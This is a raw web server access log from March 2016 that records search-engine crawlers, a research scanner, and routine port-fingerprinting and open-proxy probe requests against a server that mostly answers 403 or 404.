112.74.176.9 - - [02/Mar/2016:21:11:19 +0800] "HEAD / HTTP/1.0" 403 - "-" "-"
112.74.176.9 - - [02/Mar/2016:21:11:22 +0800] "TRACE HTTP://localhost HTTP/1.0" 200 35 "-" "-"
112.74.176.9 - - [02/Mar/2016:21:11:24 +0800] "TRACE / HTTP/1.0" 200 20 "-" "-"
112.74.176.9 - - [02/Mar/2016:21:11:27 +0800] "\x80\x80\x01\x03\x01" 501 282 "-" "-"
112.74.176.9 - - [02/Mar/2016:21:12:04 +0800] "HELO AMAP" 400 301 "-" "-"
112.74.176.9 - - [02/Mar/2016:21:12:06 +0800] "USER AMAP" 400 301 "-" "-"
112.74.176.9 - - [02/Mar/2016:21:12:51 +0800] "" 501 277 "-" "-"
112.74.176.9 - - [02/Mar/2016:21:13:12 +0800] "< NTP/1.2 >" 400 301 "-" "-"
137.226.113.7 - - [02/Mar/2016:21:13:31 +0800] "GET / HTTP/1.0" 403 4961 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36 Scanning for research (researchscan.comsys.rwth-aachen.de)"
123.125.71.106 - - [02/Mar/2016:21:14:00 +0800] "GET / HTTP/1.1" 403 4961 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
220.181.108.94 - - [02/Mar/2016:21:17:13 +0800] "GET / HTTP/1.1" 403 4961 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
2.187.253.17 - - [02/Mar/2016:21:18:54 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; yoozBot-2.2; http://yooz.ir; info@yooz.ir)"
2.187.253.17 - - [02/Mar/2016:21:18:55 +0800] "GET /html/phprm/20140623_335.html HTTP/1.1" 404 304 "-" "Mozilla/5.0 (compatible; yoozBot-2.2; http://yooz.ir; info@yooz.ir)"
148.251.136.43 - - [02/Mar/2016:21:21:07 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
148.251.136.43 - - [02/Mar/2016:21:31:26 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
148.251.136.43 - - [02/Mar/2016:21:42:47 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
95.213.187.188 - - [02/Mar/2016:21:44:40 +0800] "CONNECT check.best-proxies.ru:80 HTTP/1.1" 400 313 "-" "-"
148.251.136.43 - - [02/Mar/2016:21:53:46 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
148.251.136.43 - - [02/Mar/2016:22:04:25 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
123.125.71.116 - - [02/Mar/2016:22:13:24 +0800] "GET / HTTP/1.1" 403 4961 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
148.251.136.43 - - [02/Mar/2016:22:15:36 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
220.181.108.109 - - [02/Mar/2016:22:17:14 +0800] "GET / HTTP/1.1" 403 4961 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
148.251.136.43 - - [02/Mar/2016:22:27:02 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
5.9.10.216 - - [02/Mar/2016:22:35:16 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Wurf"
5.9.10.216 - - [02/Mar/2016:22:35:17 +0800] "GET / HTTP/1.1" 403 4961 "-" "Wurf"
148.251.136.43 - - [02/Mar/2016:22:37:33 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
112.74.32.26 - - [02/Mar/2016:22:40:54 +0800] "GET / HTTP/1.0" 403 4961 "-" "-"
112.74.32.26 - - [02/Mar/2016:22:40:56 +0800] "HEAD / HTTP/1.0" 403 - "-" "-"
112.74.32.26 - - [02/Mar/2016:22:40:58 +0800] "TRACE HTTP://localhost HTTP/1.0" 200 35 "-" "-"
112.74.32.26 - - [02/Mar/2016:22:41:00 +0800] "TRACE / HTTP/1.0" 200 20 "-" "-"
112.74.32.26 - - [02/Mar/2016:22:41:02 +0800] "\x80\x80\x01\x03\x01" 501 282 "-" "-"
112.74.32.26 - - [02/Mar/2016:22:41:44 +0800] "HELO AMAP" 400 301 "-" "-"
112.74.32.26 - - [02/Mar/2016:22:41:46 +0800] "USER AMAP" 400 301 "-" "-"
112.74.32.26 - - [02/Mar/2016:22:42:35 +0800] "" 501 277 "-" "-"
112.74.32.26 - - [02/Mar/2016:22:43:00 +0800] "< NTP/1.2 >" 400 301 "-" "-"
148.251.136.43 - - [02/Mar/2016:22:48:05 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
54.200.74.228 - - [02/Mar/2016:22:52:14 +0800] "\xf5\xcd\xf9+\xb9\xee\x8ep" 501 285 "-" "-"
121.196.208.12 - - [02/Mar/2016:22:52:56 +0800] "GET / HTTP/1.0" 403 4961 "-" "-"
121.196.208.12 - - [02/Mar/2016:22:52:58 +0800] "HEAD / HTTP/1.0" 403 - "-" "-"
121.196.208.12 - - [02/Mar/2016:22:53:00 +0800] "TRACE HTTP://localhost HTTP/1.0" 200 35 "-" "-"
121.196.208.12 - - [02/Mar/2016:22:53:02 +0800] "TRACE / HTTP/1.0" 200 20 "-" "-"
121.196.208.12 - - [02/Mar/2016:22:53:04 +0800] "\x80\x80\x01\x03\x01" 501 282 "-" "-"
121.196.208.12 - - [02/Mar/2016:22:53:40 +0800] "HELO AMAP" 400 301 "-" "-"
121.196.208.12 - - [02/Mar/2016:22:53:42 +0800] "USER AMAP" 400 301 "-" "-"
121.196.208.12 - - [02/Mar/2016:22:54:27 +0800] "" 501 277 "-" "-"
121.196.208.12 - - [02/Mar/2016:22:54:52 +0800] "< NTP/1.2 >" 400 301 "-" "-"
213.246.45.128 - - [02/Mar/2016:22:55:13 +0800] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 300 "-" "Mozilla"
148.251.136.43 - - [02/Mar/2016:22:58:13 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
